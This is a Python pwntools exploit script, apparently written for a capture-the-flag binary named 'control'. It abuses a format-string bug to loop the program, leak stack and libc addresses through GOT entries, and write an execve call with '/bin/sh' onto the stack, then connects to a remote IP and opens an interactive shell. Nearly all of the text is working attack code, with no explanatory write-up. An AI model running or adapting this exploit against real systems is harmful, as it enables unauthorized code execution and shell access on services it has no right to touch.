from pwn import *
from struct import *
import time 

nops = b'\x90'
padding = b'\x00'


clean = lambda x:  x.split('\n')[1:-2]
pad = lambda x:  x + padding*(4-len(x))


elf = ELF('./control')
context.binary = './control'
libc = ELF('/home/ashishkumarsingh/HackingTools/libc-database/db/libc6_2.30-0ubuntu2_i386.so')
# libc = ELF("/usr/lib/i386-linux-gnu/libc-2.30.so")

main_addr = 0x400805
shellcode_addr = 0x4007b8

def exec_fmt(payload):
    p = elf.process()
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

def first_stage(r, loopCount=6):
    r.readline()
    r.clean()
    payload_return2main = fmtstr_payload(offset, {0x804c010:loopCount})  # 0x804c010 is the loop variable
    print("FirstStage Payload: ", payload_return2main)
    r.sendline(payload_return2main)
    r.readline()
    time.sleep(1)
    r.clean()

def second_stage(r, address, value):
    r.clean()
    # print("Changing value of espHolder at ", espHolder)
    payload = fmtstr_payload(offset, {address:value}, write_size='short')
    print("SecondStage Payload: ", payload)
    r.sendline(payload)
    time.sleep(1)
    r.clean()

def leak_stacks(r):
    r.clean()
    payload = "%16$x %17$x %18$x %23$x"
    print("LeakStack Payload: ", payload)
    r.sendline(payload)
    time.sleep(1)
    result = r.readline().split(b' ')
    ecx = int(result[0], 16)
    ebx = int(result[1], 16)
    ebp = int(result[2], 16)
    r.clean()
    return ecx, ebx, ebp

def leak_func(r, func):
    payload_leakfunc = b'%7$s'+p32(elf.got[func])+b'\x00'
    print("FuncLeak payload: ", payload_leakfunc)
    r.sendline(payload_leakfunc)
    time.sleep(1)
    result = r.readline()
    func_leak = u32(pad(result[:4]))
    print(func,"Leaked address: ", hex(func_leak))
    r.clean()
    return func_leak

def leak_libc(r):
    fgets_leak = leak_func(r, 'fgets')
    puts_leak = leak_func(r, 'puts')
    libc_base = fgets_leak - libc.sym.fgets 
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    # assert (libc_base & 0x00000fff) == 0, "ALERT! Program is probably using different libc than specified!"
    return libc_base 

def exploit(local=False, execveOffset = libc.sym.execve, func='puts'):
    if local is False:
        r = remote('54.225.38.91', 1026)
    else:
        r = elf.process() 
        gdb.attach(r.pid, '''
        b *main+169
        b *main+175''')
    first_stage(r, 8)
    r.clean()
    ecx, ebx, ebp = leak_stacks(r)
    print("Hex: ", hex(ecx))
    newStack = ecx - 0x48
    r.clean()
    libc_base = leak_libc(r)
    print('libc leaked!')
    gad = libc_base + execveOffset
    # payload_one_gadget = fmtstr_payload(offset, {elf.got[func]:gad}, write_size='short')
    # payload = p32(gad)*4
    # r.sendline(payload)
    print("Gadget: ", hex(gad))
    second_stage(r, ecx, gad)
    binshstr = [i for i in libc.search(b'/bin/sh')][0] + libc_base
    second_stage(r, ecx+8, binshstr)
    second_stage(r, ecx+12, b'\x00'*4)
    second_stage(r, ecx+16, b'\x00'*4)
    time.sleep(1)
    print(r.clean())
    return r

a = exploit(False)
a.interactive()
